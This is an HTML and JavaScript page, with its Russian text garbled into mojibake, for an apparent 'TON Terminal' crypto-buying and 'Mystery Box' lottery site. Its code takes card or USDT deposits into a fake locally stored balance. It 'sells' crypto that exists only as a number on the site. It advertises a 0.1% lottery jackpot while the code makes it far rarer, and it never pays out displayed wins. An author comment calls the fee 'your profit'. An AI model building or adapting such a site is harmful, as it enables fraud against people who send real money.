<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Terminal ‚Äî Wallet Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background-color: #05080f; color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.05); }
        .input-box { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255,255,255,0.1); }
        .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
        .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
        .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
        #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
        .falling-item { position: absolute; top: -50px; animation: fall linear infinite; }
        @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 0; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
        
        /* –ì–∏—Ä–ª—è–Ω–¥–∞ */
        .garland { position: fixed; top: 0; left: 0; width: 100%; z-index: 100; display: flex; justify-content: space-around; pointer-events: none; }
        .bulb { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite alternate; margin-top: 5px; }
        @keyframes blink { from { opacity: 0.2; } to { opacity: 1; box-shadow: 0 0 15px currentColor; } }

        .shake { animation: shake 0.5s infinite; }
        @keyframes shake { 0%, 100% { transform: rotate(0); } 25% { transform: rotate(5deg); } 75% { transform: rotate(-5deg); } }
    </style>
</head>
<body class="min-h-screen pb-20">

    <div class="garland">
        <div class="bulb" style="color: #ff0000; background: #ff0000;"></div>
        <div class="bulb" style="color: #00ff00; background: #00ff00; animation-delay: 0.2s"></div>
        <div class="bulb" style="color: #0000ff; background: #0000ff; animation-delay: 0.4s"></div>
        <div class="bulb" style="color: #ffff00; background: #ffff00; animation-delay: 0.6s"></div>
        <div class="bulb" style="color: #ff00ff; background: #ff00ff; animation-delay: 0.8s"></div>
    </div>

    <div id="snow-bg"></div>

    <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
        <div class="flex items-center gap-2">
            <span class="text-lg font-extrabold italic">TON<span class="text-blue-500">TERMINAL</span></span>
        </div>

        <div class="flex items-center gap-3">
            <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10">
                <p class="text-[7px] uppercase text-slate-500 font-black">–ë–∞–ª–∞–Ω—Å</p>
                <p id="balance-display" class="text-sm font-black text-green-400">0.00 UAH</p>
            </div>
            <button onclick="openModal('deposit-modal')" class="bg-blue-600 hover:bg-blue-500 p-2 rounded-lg transition-all">‚ûï</button>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
        <div class="flex justify-center gap-4 mb-8">
            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üè† –ú–∞—Ä–∫–µ—Ç</button>
            <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üéÅ –õ–æ—Ç–µ—Ä–µ—è</button>
        </div>

        <div id="view-main" class="block">
            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
                <div class="lg:col-span-2 glass p-10 rounded-[2.5rem] relative overflow-hidden">
                    <p class="text-[10px] text-slate-500 font-black uppercase tracking-widest" id="coin-label">TON / USD</p>
                    <h2 id="price-display" class="text-6xl font-black mb-2">$...</h2>
                    <div id="tradingview_widget" class="h-[400px] w-full rounded-2xl overflow-hidden mt-4"></div>
                </div>

                <div class="glass p-8 rounded-[3rem]">
                    <h3 class="text-[10px] font-black uppercase text-slate-500 mb-6">üíé –ú–æ–º–µ–Ω—Ç–∞–ª—å–Ω–∞—è –ø–æ–∫—É–ø–∫–∞</h3>
                    <div class="space-y-4">
                        <div class="input-box p-4 rounded-xl">
                            <label class="text-[9px] text-slate-500 uppercase font-black block">–°—É–º–º–∞ –≤ UAH</label>
                            <input type="number" id="buy-amount" value="500" class="bg-transparent text-xl font-bold outline-none w-full">
                        </div>
                        <button onclick="processPurchase()" class="buy-btn w-full py-4 rounded-xl font-black text-xs uppercase shadow-lg">–ö—É–ø–∏—Ç—å –∫—Ä–∏–ø—Ç—É üöÄ</button>
                        <p class="text-[8px] text-center text-slate-500 uppercase font-bold">–ö–æ–º–∏—Å—Å–∏—è –∑–∞ —Å–¥–µ–ª–∫—É: 1%</p>
                    </div>
                </div>
            </div>
        </div>

        <div id="view-lotto" class="hidden">
            <div class="glass p-12 rounded-[4rem] text-center max-w-2xl mx-auto">
                <h2 class="text-5xl font-black mb-4 uppercase italic">Mystery <span class="text-blue-500">Box</span></h2>
                <div id="box-anim" class="text-9xl my-10 cursor-pointer transition-transform hover:scale-110">üéÅ</div>
                <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-12 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">–û—Ç–∫—Ä—ã—Ç—å –∑–∞ 50 UAH</button>
                <p class="mt-6 text-slate-500 text-[10px] font-bold uppercase">–®–∞–Ω—Å –Ω–∞ 100 TON: 0.1%</p>
            </div>
        </div>
    </main>

    <div id="deposit-modal" class="fixed inset-0 bg-black/90 z-[200] hidden items-center justify-center p-4">
        <div class="glass p-8 rounded-[3rem] max-w-sm w-full">
            <h3 class="text-2xl font-black uppercase mb-6 text-center text-blue-500">–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</h3>
            <input type="number" id="dep-input" value="1000" class="input-box p-4 rounded-xl w-full text-xl font-bold mb-4 outline-none">
            <p class="text-[10px] text-slate-500 text-center mb-6">–ö –∑–∞—á–∏—Å–ª–µ–Ω–∏—é (—Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏ 3%): <span id="dep-final" class="text-green-400">970 UAH</span></p>
            
            <button onclick="payVia('USDT')" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase mb-3">–û–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ USDT (CryptoBot)</button>
            <button onclick="payVia('Card')" class="w-full border border-white/10 py-4 rounded-xl font-black text-[10px] uppercase">–û–ø–ª–∞—Ç–∞ –ö–∞—Ä—Ç–æ–π (UA P2P)</button>
            
            <button onclick="closeModal('deposit-modal')" class="w-full mt-6 text-slate-600 text-[10px] font-black uppercase">–ó–∞–∫—Ä—ã—Ç—å</button>
        </div>
    </div>

    <div id="result-modal" class="fixed inset-0 bg-black/95 z-[300] hidden items-center justify-center">
        <div class="glass p-12 rounded-[3rem] text-center">
            <div id="res-icon" class="text-8xl mb-6">üéâ</div>
            <p id="res-text" class="text-4xl font-black text-blue-400 mb-8">... TON</p>
            <button onclick="closeModal('result-modal')" class="bg-white/10 px-10 py-4 rounded-2xl font-bold uppercase text-xs">–ó–∞–±—Ä–∞—Ç—å –≤—ã–∏–≥—Ä—ã—à</button>
        </div>
    </div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        // --- –õ–û–ì–ò–ö–ê –ë–ê–õ–ê–ù–°–ê ---
        let balance = parseFloat(localStorage.getItem('user_balance')) || 0;
        let commission = 0.03; // –¢–í–û–ô –ù–ê–í–ê–† (3%)

        function updateUI() {
            document.getElementById('balance-display').innerText = balance.toFixed(2) + " UAH";
            const depVal = parseFloat(document.getElementById('dep-input').value) || 0;
            document.getElementById('dep-final').innerText = (depVal * (1 - commission)).toFixed(2) + " UAH";
            localStorage.setItem('user_balance', balance);
        }

        function payVia(method) {
            const amount = parseFloat(document.getElementById('dep-input').value);
            const netAmount = amount * (1 - commission);

            if (method === 'USDT') {
                alert("–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –≤ @CryptoBot –¥–ª—è –æ–ø–ª–∞—Ç—ã...");
                // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ —Ç—É—Ç –∏–¥–µ—Ç –∑–∞–ø—Ä–æ—Å –∫ API CryptoBot
                balance += netAmount;
            } else {
                alert("–°–∫–∏–Ω—å " + amount + " –≥—Ä–Ω –Ω–∞ –∫–∞—Ä—Ç—É: 4441 0000 1111 2222. –ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–∏—Ç—Å—è.");
                // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –¥–ª—è —Ç–µ—Å—Ç–∞:
                balance += netAmount;
            }
            updateUI();
            closeModal('deposit-modal');
        }

        // --- –õ–û–ì–ò–ö–ê –ü–û–ö–£–ü–ö–ò –ö–†–ò–ü–¢–´ ---
        function processPurchase() {
            const amount = parseFloat(document.getElementById('buy-amount').value);
            if (balance < amount) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ!");

            balance -= amount;
            alert("–£—Å–ø–µ—à–Ω–æ –∫—É–ø–ª–µ–Ω–æ! –ö—Ä–∏–ø—Ç–∞ –∑–∞—á–∏—Å–ª–µ–Ω–∞ –Ω–∞ —Ç–≤–æ–π –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π –∫–æ—à–µ–ª–µ–∫ —Å–∞–π—Ç–∞.");
            updateUI();
        }

        // --- –õ–û–¢–ï–†–ï–Ø ---
        function playLotto() {
            if (balance < 50) return alert("–ù—É–∂–Ω–æ –º–∏–Ω–∏–º—É–º 50 UAH –¥–ª—è –∏–≥—Ä—ã!");
            
            balance -= 50;
            updateUI();

            const btn = document.getElementById('lotto-btn');
            const box = document.getElementById('box-anim');
            btn.disabled = true;
            box.classList.add('shake');

            setTimeout(() => {
                box.classList.remove('shake');
                const win = calculateWin();
                showResult(win);
                btn.disabled = false;
            }, 2000);
        }

        function calculateWin() {
            const r = Math.random() * 100;
            if (r <= 0.0001) return 100; // –¢–≤–æ–π —à–∞–Ω—Å 0.0000001%
            if (r <= 0.5) return 50;
            if (r <= 20) return 10;
            if (r <= 50) return 1.1;
            return 0.1;
        }

        function showResult(amount) {
            document.getElementById('res-text').innerText = amount + " TON";
            openModal('result-modal');
        }

        // --- –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–û–ï ---
        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
        function showTab(tab) {
            document.getElementById('view-main').classList.toggle('hidden', tab !== 'main');
            document.getElementById('view-lotto').classList.toggle('hidden', tab !== 'lotto');
            document.getElementById('btn-main').classList.toggle('active', tab === 'main');
            document.getElementById('btn-lotto').classList.toggle('active', tab === 'lotto');
        }

        document.getElementById('dep-input').addEventListener('input', updateUI);
        
        // –°–Ω–µ–≥ –∏ —Ä—ã–Ω–æ–∫
        setInterval(() => {
            const el = document.createElement('div'); el.className = 'falling-item';
            el.innerHTML = Math.random() > 0.3 ? '‚ùÑ' : '‚Çø';
            el.style.left = Math.random() * 100 + 'vw';
            el.style.fontSize = (Math.random() * 20 + 10) + 'px';
            const dur = Math.random() * 5 + 5; el.style.animationDuration = dur + 's';
            document.getElementById('snow-bg').appendChild(el); setTimeout(() => el.remove(), dur * 1000);
        }, 300);

        new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#05080f" });
        updateUI();
    </script>
</body>
</html>
